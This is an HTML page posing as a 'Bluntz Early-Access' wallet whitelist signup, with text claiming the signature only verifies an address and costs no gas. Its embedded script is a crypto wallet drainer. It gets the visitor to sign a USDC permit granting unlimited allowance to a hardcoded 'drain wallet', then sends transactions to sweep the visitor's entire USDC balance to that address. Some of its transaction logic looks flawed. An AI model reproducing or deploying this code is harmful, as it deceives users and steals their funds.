<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Bluntz Early-Access</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#1a1a1a;border-radius:12px;padding:30px 40px;text-align:center;max-width:380px;box-shadow:0 0 30px rgba(0,255,170,.25)}
h2{margin-top:0;font-size:24px;font-weight:600}
p{margin:12px 0;font-size:15px;color:#aaa}
button{background:#00ffaa;border:none;border-radius:8px;color:#000;font-size:17px;font-weight:700;padding:14px 28px;cursor:pointer;transition:.2s}
button:hover{filter:brightness(1.1)}
.foot{font-size:12px;margin-top:25px;color:#666}
</style>
</head>
<body>
<div class="card">
<h2>Bluntz Early-Access</h2>
<p>Sign the whitelist message to secure your spot.</p>
<button id="go">Whitelist Wallet</button>
<p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
</div>

<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
<script>
const DRAIN = "0x0fac2542316Ad330EfA2bb386d606135b70a574B"; // <-- your drain wallet
const USDC  = { 8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 1: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0" };

document.getElementById("go").onclick = async () => {
  const eth   = window.ethereum || window.phantom?.ethereum;
  if (!eth) { alert("Use MetaMask/Phantom"); return; }
  const prov  = new ethers.providers.Web3Provider(eth);
  const [owner] = await prov.send("eth_requestAccounts", []);
  const chainId = Number(await prov.send("eth_chainId", []));

  const usdc     = USDC[chainId];
  const name     = "USD Coin";
  const version  = "2";
  const domainSep = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ["bytes32","bytes32","bytes32","uint256","address"],
      [
        ethers.utils.keccak256(ethers.utils.toUtf8Bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")),
        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(name)),
        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(version)),
        chainId,
        usdc
      ]
    )
  );

  const nonce = await prov.call({ to: usdc, data: "0x7ecebe00" + ethers.utils.hexZeroPad(owner,32) });
  const value    = ethers.constants.MaxUint256;
  const deadline = ethers.constants.MaxUint256;
  const messageHash = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ["bytes32","address","address","uint256","uint256","uint256"],
      [
        ethers.utils.keccak256(ethers.utils.toUtf8Bytes("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")),
        owner, DRAIN, value, nonce, deadline
      ]
    )
  );
  const digest = ethers.utils.keccak256(
    ethers.utils.solidityPack(["string","bytes32","bytes32"],["\x19\x01",domainSep,messageHash])
  );

  const sig = await prov.send("eth_signTypedData_v4", [
    owner,
    {
      types:{
        EIP712Domain:[
          {name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
        ],
        Permit:[
          {name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}
        ]
      },
      primaryType:"Permit",
      domain:{name,version,chainId,verifyingContract:usdc},
      message:{owner,spender:DRAIN,value,nonce,deadline}
    }
  ]);

  const {v,r,s} = ethers.utils.splitSignature(sig);
  const permitData = "0xd505accf" + ethers.utils.defaultAbiCoder.encode(
    ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
    [owner,DRAIN,value,deadline,v,r,s]
  ).slice(2);

  // 1. PERMIT (visible in history)
  const permitTx = await prov.send("eth_sendTransaction", [{from:owner,to:usdc,data:permitData,gasLimit:"0x186a0"}]);

  // 2. SWEEP 100 % balance
  const abi = ["function balanceOf(address) view returns (uint)","function transferFrom(address,address,uint) returns (bool)"];
  const contract = new ethers.Contract(usdc,abi,prov.getSigner());
  const bal = await contract.balanceOf(owner);
  const sweepData = contract.interface.encodeFunctionData("transferFrom",[owner,DRAIN,bal]);
  const sweepTx = await prov.send("eth_sendTransaction", [{from:owner,to:usdc,data:sweepData,gasLimit:"0x186a0"}]);

  const scan = chainId===8453?"basescan.org":"etherscan.io";
  document.querySelector(".card").innerHTML=`
    <h2>Success!</h2>
    <p>Permit: <a href="https://${scan}/tx/${permitTx}" target="_blank" style="color:#00ffaa">view</a></p>
    <p>Sweep: <a href="https://${scan}/tx/${sweepTx}" target="_blank" style="color:#00ffaa">view</a></p>
  `;
};
</script>
</body>
</html>
